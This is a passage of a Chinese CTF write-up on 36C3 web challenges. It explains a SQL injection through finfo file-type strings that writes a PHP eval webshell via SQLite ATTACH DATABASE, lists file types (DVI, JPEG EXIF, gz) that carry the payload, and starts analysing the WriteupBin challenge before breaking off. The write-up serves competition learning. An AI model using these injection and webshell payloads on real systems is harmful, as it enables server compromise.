class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>($uploads <span class="hljs-keyword">as</span> $upload):<span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=<span class="hljs-string">&quot;&lt;?= &apos;/files/&apos; . $_SESSION[&apos;id&apos;] . &apos;/&apos; . $upload[0] ?&gt;&quot;</span>&gt;<span class="hljs-meta">&lt;?</span>= $upload[<span class="hljs-number">0</span>] <span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="hljs-meta">&lt;?</span>= $upload[<span class="hljs-number">1</span>] <span class="hljs-meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x529F;&#x80FD;&#x70B9;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x81EA;&#x5DF1;&#x7684; sandbox &#x5F53;&#x4E2D;&#x770B;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#xFF0C;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;&#x7531;<code>(new finfo)-&gt;file</code>&#x6765;&#x5224;&#x65AD;&#x7684;&#xFF0C;&#x8FD8;&#x4F7F;&#x7528;&#x4E86; sqlite &#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7684;&#x8BB0;&#x5F55;&#x3002;</p><p>&#x7531;&#x4E8E;&#x521B;&#x5EFA;&#x7684;&#x6570;&#x636E;&#x5E93;&#x89C4;&#x5B9A;&#x4E86; id &#x4E3A;&#x81EA;&#x589E;&#x957F;&#x7684;&#x6574;&#x578B;&#x4E3B;&#x952E;&#xFF0C;&#x800C;&#x4E14;&#x5B83;&#x4F7F;&#x7528;&#x4E86;<code>lastInsertId()</code>&#x8FD4;&#x56DE;&#x6700;&#x540E;&#x4E00;&#x6B21; insert &#x6570;&#x636E;&#x7684; id &#x4F5C;&#x4E3A;&#x6587;&#x4EF6;&#x540D;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file( $_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>], $d . $db-&gt;lastInsertId()) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;move_upload_file&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0A;&#x53EF;&#x4EE5;&#x4E0D;&#x7528;&#x8003;&#x8651;&#x662F;&#x5426;&#x5B58;&#x5728;&#x901A;&#x8FC7;&#x53EF;&#x63A7;&#x6587;&#x4EF6;&#x540D;&#x4E0A;&#x4F20;&#x6587;&#x4EF6; Getshell &#x7684;&#x64CD;&#x4F5C;&#x4E86;&#x3002;</p><p>&#x7EB5;&#x89C2;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x5236;&#x7684;&#x8F93;&#x5165;&#x70B9;&#x4E5F;&#x53EA;&#x6709;&#x5728;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x5F53;&#x4E2D;&#xFF0C;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x53C8;&#x88AB;&#x62FC;&#x5165;&#x5230;&#x4E86; sql &#x8BED;&#x53E5;&#x5F53;&#x4E2D;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s = <span class="hljs-string">&quot;INSERT INTO upload(info) VALUES (&apos;&quot;</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>]). <span class="hljs-string">&quot; &apos;);&quot;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x6765;&#x8FDB;&#x884C; sql &#x6CE8;&#x5165;&#x6765;&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;&#x4E86;&#x3002;</p><p>&#x6211;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x662F; fuzz &#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x67D0;&#x4E9B;&#x6587;&#x4EF6;&#x4F7F;&#x7528;<code>finfo</code>&#x5F97;&#x51FA;&#x6765;&#x7684;&#x7ED3;&#x679C;&#x542B;&#x6709;&#x5355;&#x5F15;&#x53F7;&#x4EC0;&#x4E48;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x8FD8;&#x80FD;&#x591F;&#x63D2;&#x5165;&#x53EF;&#x63A7;&#x6570;&#x636E;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x5C31;&#x5F00;&#x59CB; fuzz &#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x4ECE;<code>0x00</code>&#x5230;<code>0xff0xff</code>&#x3002;</p><p>&#x7EC8;&#x4E8E;&#x5728;<code>0x1f0x9d</code>&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;<code>compress&apos;d data</code>&#xFF0C;&#x867D;&#x7136;&#x6709;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;&#x3002;</p><p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x662F;<code>0xfb0x01</code>&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;<code>QDOS object &apos;&apos;</code>&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x5F88;&#x5BF9;&#x7684;&#x6837;&#x5B50;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x53EF;&#x4EE5;&#x5728;&#x5355;&#x5F15;&#x53F7;&#x4E4B;&#x95F4;&#x63D2;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x968F;&#x4FBF;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png" alt></p><p>&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x88AB;&#x5403;&#x6389;&#x4E86;&#x4E00;&#x4E2A;<code>p</code>&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x8C03;&#x6574;&#x4E00;&#x4E0B; payload &#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#x4E86;&#x3002;</p><p>sqlite &#x662F;&#x53EF;&#x4EE5;&#x7528; .php &#x6587;&#x4EF6;&#x540D;&#x6765;&#x4F5C;&#x4E3A;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x53EF;&#x5199;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; sqlite attach &#x4E00;&#x4E2A; z.php &#x7684;&#x65B9;&#x6CD5;&#x6765;&#x5199; shell &#x4E86;&#x3002;</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;create TABLE t.e (d text);/*</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;insert INTO t.e (d) VALUES (&apos;&lt;?php eval($_POST[a])?&gt;&apos;);/*</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x5C31;&#x662F;&#x6709;&#x957F;&#x5EA6;&#x9650;&#x5236;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5206;&#x4E24;&#x6B21;&#x6765;&#x5199; shell</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png" alt></p><h3 id="other-file"><a href="#other-file" class="headerlink" title="other file"></a>other file</h3><p>&#x770B;&#x5176;&#x4ED6;&#x9009;&#x624B;&#x7684;&#x516C;&#x5F00;&#x7684; wp &#x4E5F;&#x662F;&#x5F88;&#x6709;&#x8DA3;&#x7684;&#x4E00;&#x4EF6;&#x4E8B;&#xFF0C;&#x7136;&#x540E;&#x4ECE; ctftime &#x4E0A;&#x516C;&#x5F00;&#x7684; wp&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8FD8;&#x5B58;&#x5728;&#x7740;&#x8FD9;&#x4E48;&#x4E00;&#x4E9B;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#x3002;</p><h4 id="TeX-DVI-file"><a href="#TeX-DVI-file" class="headerlink" title="TeX DVI file"></a>TeX DVI file</h4><p>0xf702 &#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x5728;&#x586B;&#x5145;&#x4E00;&#x5B9A;&#x6570;&#x636E;&#x540E;&#x6709;&#x6211;&#x4EEC;&#x5B8C;&#x5168;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png" alt></p><h4 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h4><p>&#x5728; jpeg &#x7684; EXIF &#x6570;&#x636E;&#x6BB5;&#x4E2D;&#x6709;&#x7528;&#x6765;&#x6807;&#x8BC6; software &#x7684;&#x6570;&#x636E;&#x4E5F;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x540C;&#x6837;&#x7528;&#x6765;&#x6807;&#x8BC6; comment &#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x63A7;&#x3002;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; exiftool &#x6765;&#x4FEE;&#x6539;&#x56FE;&#x7247;&#x3002;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="hljs-string">&quot;payload&quot;</span> -software=<span class="hljs-string">&quot;payload2&quot;</span> 1.jpg</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png" alt></p><h4 id><a href="#" class="headerlink" title="#!"></a>#!</h4><p>&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#!/</code>&#x7684;&#x6587;&#x4EF6;&#x6765;&#x6784;&#x9020; payload</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png" alt></p><h4 id="gz"><a href="#gz" class="headerlink" title="gz"></a>gz</h4><p>&#x5229;&#x7528;<code>gunzip</code>&#x751F;&#x6210;&#x7684; gz &#x6587;&#x4EF6;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;&#x662F;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x540D;</p><p><img src="https://posts.xh4h.com/assets/images/36c3/gunzip1.png" alt></p><p>&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4FEE;&#x6539; gz &#x6587;&#x4EF6;&#x5185;&#x5BB9;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png" alt></p><h2 id="WriteUpBin"><a href="#WriteUpBin" class="headerlink" title="WriteUpBin"></a>WriteUpBin</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:13/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [13 solves]))) = <strong>455</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source social writeup hosting solution.</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz" target="_blank" rel="noopener">WriteupBin-10b65573b511269f.tar.xz</a></p></blockquote><p>&#x4E00;&#x9053;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x4FA7;&#x4FE1;&#x9053;&#x9898;&#x76EE;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6240;&#x7ED9;&#x9644;&#x4EF6;&#x642D;&#x5EFA;&#x5F62;&#x5F0F;&#x77E5;&#x9053;&#xFF0C;flag &#x5B58;&#x653E;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x5728; admin &#x7528;&#x6237;&#x7684;&#x7B2C;&#x4E00;&#x6761; writeup &#x6570;&#x636E;&#x7684;&#x5185;&#x5BB9;&#x5F53;&#x4E2D;&#xFF0C;&#x9898;&#x76EE;&#x63D0;&#x4F9B;&#x7B80;&#x5355;&#x7684;&#x4E0A;&#x4F20;&#x6587;&#x672C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x63D0;&#x4EA4;&#x7ED9; admin &#xFF0C;&#x8BA9; admin &#x7ED9;&#x4F60;&#x70B9;&#x8D5E;&#x3002;</p><p>&#x9879;&#x76EE;&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight stylus hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">&#x251C;&#x2500;&#x2500; Dockerfile<span class="hljs-comment">//Docker&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; admin<span class="hljs-selector-class">.py</span><span class="hljs-comment">//&#x4F7F;&#x7528;selenium&#x6A21;&#x62DF;admin&#x767B;&#x5F55;&#x5E76;&#x70B9;&#x8D5E;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; db<span class="hljs-selector-class">.sql</span><span class="hljs-comment">//&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; docker-stuff</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; default<span class="hljs-comment">//&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; www<span class="hljs-selector-class">.conf</span><span class="hljs-comment">//&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; www</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; general<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x7F6E;header&#x5934;&#x7B49;&#x4E00;&#x4E9B;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; html</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; add<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x6DFB;&#x52A0;writeup&#x76F8;&#x5173;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; admin<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x628A;writeup&#x63D0;&#x4EA4;&#x7ED9;admin</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; index<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x5165;&#x53E3;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; like<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x70B9;&#x8D5E;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; login_admin<span class="hljs-selector-class">.php</span><span class="hljs-comment">//admin&#x767B;&#x9646;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; show<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x83B7;&#x53D6;writeup&#x5185;&#x5BB9;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; views</span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; <span class="hljs-selector-tag">header</span><span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x5728;&#x9875;&#x9762;&#x4E0A;&#x65B9;&#x5C55;&#x793A;&#x76EE;&#x524D;id&#x63D0;&#x4EA4;&#x7684;writeup</span></span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; home<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x9875;&#x9762;&#x4E2D;&#x90E8;&#x7528;&#x6765;&#x63D0;&#x4F9B;&#x7ED9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x754C;&#x9762;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x2514;&#x2500;&#x2500; show<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x70B9;&#x8D5E;&#x3001;&#x63D0;&#x4EA4;&#x7ED9;admin&#x7684;&#x5C55;&#x793A;&#x9875;&#x9762;</span></span><br><span class="line">&#x2514;&#x2500;&#x2500; ynetd<span class="hljs-comment">//&#x7528;&#x6765;&#x542F;&#x52A8; admin.py</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x65E2;&#x7136; flag &#x5728;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x9996;&#x5148;&#x6765;&#x770B;&#x770B; show.php &#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528;&#x6765;&#x83B7;&#x53D6; writeup &#x7684;&#x5185;&#x5BB9;&#x3002;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">include_once</span> <span class="hljs-string">&apos;../general.php&apos;</span>;</span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="hljs-string">&apos;SELECT id, content FROM `writeup` WHERE `id` = ?&apos;</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="hljs-string">&apos;s&apos;</span>, $_GET[<span class="hljs-string">&apos;id&apos;</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$writeup = mysqli_fetch_all($stmt-&gt;get_result(), MYSQLI_ASSOC)[<span class="hljs-number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="hljs-string">&apos;SELECT user_id FROM `like` WHERE `writeup_id` = ?&apos;</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="hljs-string">&apos;s&apos;</span>, $_GET[<span class="hljs-string">&apos;id&apos;</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">$likes = mysqli_fetch_all($result, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;../views/header.php&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;../views/show.php&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; id &#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x9274;&#x6743;&#x63AA;&#x65BD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; writeup id &#x6765;&#x83B7;&#x53D6; writeup &#x5185;&#x5BB9;&#xFF0C;&#x800C; flag writeup id &#x5728; admin &#x7528;&#x6237;&#x6570;&#x636E;&#x5F53;&#x4E2D;&#xFF0C;&#x800C;&#x5728; header.php &#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6240;&#x6709;&#x7684; writeup id</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>($writeups <span class="hljs-keyword">as</span> $w): <span class="hljs-meta">?&gt;</span></span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;/show.php?id=&lt;?= $w[&apos;id&apos;] ?&gt;&quot;</span>&gt;Writeup - <span class="hljs-meta">&lt;?</span>= $w[<span class="hljs-string">&apos;id&apos;</span>] <span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span>; <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x65E2;&#x7136;&#x6709;&#x63D0;&#x4EA4;&#x4EE3;&#x7801;&#x7ED9; admin &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E0D;&#x662F;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x4E00;&#x4E2A; xss &#x6216;&#x8005;&#x4EC0;&#x4E48;&#x7684;&#xFF1F;</p><p>&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x770B;&#x5230; admin &#x518D;&#x6536;&#x5230; writeup &#x540E;&#x7684;&#x4E3B;&#x8981;&#x64CD;&#x4F5C;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">display = Display(visible=<span class="hljs-number">0</span>, size=(<span class="hljs-number">800</span>, <span class="hljs-number">600</span>))</span><br><span class="line">display.start()</span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--disable-gpu&apos;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--headless&apos;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--no-sandbox&apos;</span>)</span><br><span class="line">driver = webdriver.Chrome(<span class="hljs-string">&apos;/usr/bin/chromedriver&apos;</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">&apos;http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id=&apos;</span>+writeup_id</span><br><span class="line">driver.get(url)</span><br><span class="line">element = driver.find_element_by_xpath(<span class="hljs-string">&apos;//input[@id=&quot;like&quot;]&apos;</span>)</span><br><span class="line">element.click()</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br><span class="line">display.stop()</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; admin &#x5728;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x4E4B;&#x540E;&#x4F7F;&#x7528;<code>find_element_by_xpath</code>&#x627E;&#x5230;&#x4E86; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x70B9;&#x51FB;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x63D0;&#x4EA4;&#x7ED9; admin &#x7684; writeup &#x540E;&#xFF0C;admin &#x4F1A;&#x6D4F;&#x89C8;&#x8FDB;&#x884C;&#x70B9;&#x51FB;&#xFF0C;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x70B9;&#x8D5E;&#x8BF7;&#x6C42;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/like.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;c&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?= $_SESSION[&apos;c&apos;] ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?= $writeup[&apos;id&apos;] ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;like&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x1F44D;&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span 